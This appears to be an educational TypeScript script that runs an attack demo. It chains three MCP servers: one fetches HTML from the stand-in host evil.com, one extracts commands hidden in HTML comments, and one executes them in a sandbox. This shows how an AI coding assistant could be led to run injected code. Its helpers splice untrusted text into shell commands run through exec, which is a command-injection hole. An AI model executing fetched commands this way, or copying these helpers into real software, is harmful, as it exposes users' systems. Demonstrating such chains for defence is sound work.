#!/usr/bin/env node

/**
 * MCP Security Demo - Attack Orchestrator
 *
 * Demonstrates the complete vulnerability chain:
 * Server 1 (fetch) → Server 2 (parse) → Server 3 (execute)
 *
 * This simulates how an AI assistant like Claude Code could be
 * tricked into executing malicious code through MCP servers.
 */

import { spawn } from 'child_process';
import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'fs';
import chalk from 'chalk';

interface ServerProcess {
  name: string;
  proc: ReturnType<typeof spawn>;
  ready: boolean;
}

/**
 * Send MCP request to server via stdio
 */
async function sendMCPRequest(
  server: ServerProcess,
  method: string,
  params: Record<string, any>
): Promise<any> {
  return new Promise((resolve, reject) => {
    const request = {
      jsonrpc: '2.0',
      id: Date.now(),
      method,
      params,
    };

    let response = '';

    const onData = (data: Buffer) => {
      response += data.toString();
      try {
        const lines = response.split('\n').filter(l => l.trim());
        for (const line of lines) {
          const parsed = JSON.parse(line);
          if (parsed.id === request.id) {
            server.proc.stdout?.off('data', onData);
            resolve(parsed);
            return;
          }
        }
      } catch (e) {
        // Not complete yet, wait for more data
      }
    };

    server.proc.stdout?.on('data', onData);
    server.proc.stdin?.write(JSON.stringify(request) + '\n');

    setTimeout(() => {
      server.proc.stdout?.off('data', onData);
      reject(new Error(`Timeout waiting for ${server.name}`));
    }, 5000);
  });
}

/**
 * Execute the attack chain
 */
async function executeAttack() {
  console.log(chalk.red.bold('\n🎯 MCP SECURITY DEMONSTRATION'));
  console.log(chalk.gray('='.repeat(60)));
  console.log(chalk.yellow('⚠️  Educational demonstration of vulnerability chain'));
  console.log(chalk.gray('='.repeat(60)));
  console.log('');

  const results: any = {
    timestamp: new Date().toISOString(),
    steps: [],
    success: false,
  };

  try {
    // Step 1: Fetch malicious content from Server 1
    console.log(chalk.cyan.bold('Step 1: Fetching content from Server 1 (Unsafe Input)'));
    console.log(chalk.gray('  URL: http://evil.com/malicious'));

    const fetchResponse = await fetchServer1('http://evil.com/malicious');

    console.log(chalk.green('  ✓ Response received'));
    console.log(chalk.gray('  Contains HTML with hidden payload in comment'));

    results.steps.push({
      step: 1,
      server: 'input',
      action: 'fetch_content',
      success: true,
    });

    // Step 2: Parse content with Server 2
    console.log('');
    console.log(chalk.cyan.bold('Step 2: Parsing content with Server 2 (Processing)'));

    const parseResponse = await parseWithServer2(fetchResponse.content);

    console.log(chalk.yellow('  ⚠️  Extracted commands from HTML comments:'));
    for (const cmd of parseResponse.commands) {
      console.log(chalk.red(`     - ${cmd.code}`));
      console.log(chalk.gray(`       Risk: ${cmd.risk}, Flags: ${cmd.flags.join(', ')}`));
    }

    results.steps.push({
      step: 2,
      server: 'processing',
      action: 'extract_commands',
      commandsFound: parseResponse.commands.length,
      success: true,
    });

    // Step 3: Execute commands with Server 3
    console.log('');
    console.log(chalk.cyan.bold('Step 3: Executing commands with Server 3 (Execution)'));

    const executionResults = [];

    for (const cmd of parseResponse.commands) {
      console.log(chalk.gray(`  Executing: ${cmd.code}`));

      const execResult = await executeWithServer3(cmd.code);

      if (execResult.success) {
        console.log(chalk.red(`  ✓ Executed successfully`));
        executionResults.push({ command: cmd.code, success: true });
      } else if (execResult.blocked) {
        console.log(chalk.yellow(`  ✗ Blocked: ${execResult.blockReason}`));
        executionResults.push({ command: cmd.code, blocked: true });
      } else {
        console.log(chalk.gray(`  ✗ Failed: ${execResult.stderr}`));
        executionResults.push({ command: cmd.code, failed: true });
      }
    }

    results.steps.push({
      step: 3,
      server: 'execution',
      action: 'execute_commands',
      executed: executionResults.filter(r => r.success).length,
      blocked: executionResults.filter(r => r.blocked).length,
      failed: executionResults.filter(r => r.failed).length,
    });

    // Step 4: Verify attack success
    console.log('');
    console.log(chalk.cyan.bold('Step 4: Verifying attack results'));

    const filesResponse = await listSandboxFiles();

    console.log(chalk.gray('  Sandbox directory: ' + filesResponse.path));
    console.log(chalk.gray('  Files created:'));

    for (const file of filesResponse.files) {
      console.log(chalk.red(`    - ${file}`));
    }

    results.filesCreated = filesResponse.files.length;
    results.success = filesResponse.files.length > 0;

    // Summary
    console.log('');
    console.log(chalk.red.bold('='.repeat(60)));
    if (results.success) {
      console.log(chalk.red.bold('🚨 ATTACK SUCCESSFUL 🚨'));
      console.log('');
      console.log(chalk.yellow('Malicious code was executed through the MCP chain:'));
      console.log(chalk.gray('  1. Server 1 fetched malicious HTML (no validation)'));
      console.log(chalk.gray('  2. Server 2 extracted commands (flagged but not blocked)'));
      console.log(chalk.gray('  3. Server 3 executed commands (trusted Server 2)'));
      console.log('');
      console.log(chalk.red(`Files created in sandbox: ${results.filesCreated}`));
    } else {
      console.log(chalk.green.bold('✓ ATTACK BLOCKED'));
      console.log(chalk.gray('Security measures prevented execution'));
    }
    console.log(chalk.red.bold('='.repeat(60)));
    console.log('');

    // Save results
    const resultsDir = './results';
    if (!existsSync(resultsDir)) {
      mkdirSync(resultsDir, { recursive: true });
    }

    writeFileSync(
      `${resultsDir}/attack-report-${Date.now()}.json`,
      JSON.stringify(results, null, 2)
    );

    console.log(chalk.gray('Report saved to results/'));
    console.log('');

  } catch (error) {
    console.error(chalk.red('\n❌ Error during attack:'), error);
    results.error = String(error);
  }

  return results;
}

/**
 * Simplified functions that directly call servers
 * (In a real implementation, these would use MCP Client SDK)
 */

async function fetchServer1(url: string): Promise<any> {
  // Simulate calling Server 1
  const { exec } = await import('child_process');
  return new Promise((resolve, reject) => {
    const cmd = `echo '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"fetch_content","arguments":{"url":"${url}"}}}' | node ../servers/01-unsafe-input-server/dist/index.js 2>/dev/null`;

    exec(cmd, (error, stdout) => {
      if (error) return reject(error);
      try {
        const response = JSON.parse(stdout);
        const content = JSON.parse(response.result.content[0].text);
        resolve(content);
      } catch (e) {
        reject(e);
      }
    });
  });
}

async function parseWithServer2(content: string): Promise<any> {
  const { exec } = await import('child_process');
  return new Promise((resolve, reject) => {
    // First parse markdown
    const parseCmd = `echo '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"parse_markdown","arguments":{"content":${JSON.stringify(content)}}}}' | node ../servers/02-processing-server/dist/index.js 2>/dev/null`;

    exec(parseCmd, (error, stdout) => {
      if (error) return reject(error);
      try {
        const parseResponse = JSON.parse(stdout);
        const parsed = JSON.parse(parseResponse.result.content[0].text);

        // Then extract commands
        const extractCmd = `echo '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"extract_commands","arguments":{"blocks":${JSON.stringify(parsed.blocks)}}}}' | node ../servers/02-processing-server/dist/index.js 2>/dev/null`;

        exec(extractCmd, (error2, stdout2) => {
          if (error2) return reject(error2);
          try {
            const extractResponse = JSON.parse(stdout2);
            const result = JSON.parse(extractResponse.result.content[0].text);
            resolve(result);
          } catch (e) {
            reject(e);
          }
        });
      } catch (e) {
        reject(e);
      }
    });
  });
}

async function executeWithServer3(command: string): Promise<any> {
  const { exec } = await import('child_process');
  return new Promise((resolve, reject) => {
    const cmd = `echo '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"${command}"}}}' | node ../servers/03-execution-server/dist/index.js 2>/dev/null`;

    exec(cmd, (error, stdout) => {
      if (error) return reject(error);
      try {
        const response = JSON.parse(stdout);
        const result = JSON.parse(response.result.content[0].text);
        resolve(result);
      } catch (e) {
        reject(e);
      }
    });
  });
}

async function listSandboxFiles(): Promise<any> {
  const { exec } = await import('child_process');
  return new Promise((resolve, reject) => {
    const cmd = `echo '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"list_sandbox_files","arguments":{}}}' | node ../servers/03-execution-server/dist/index.js 2>/dev/null`;

    exec(cmd, (error, stdout) => {
      if (error) return reject(error);
      try {
        const response = JSON.parse(stdout);
        const result = JSON.parse(response.result.content[0].text);
        resolve(result);
      } catch (e) {
        reject(e);
      }
    });
  });
}

// Run demo
executeAttack().then(() => {
  process.exit(0);
}).catch(error => {
  console.error('Fatal error:', error);
  process.exit(1);
});
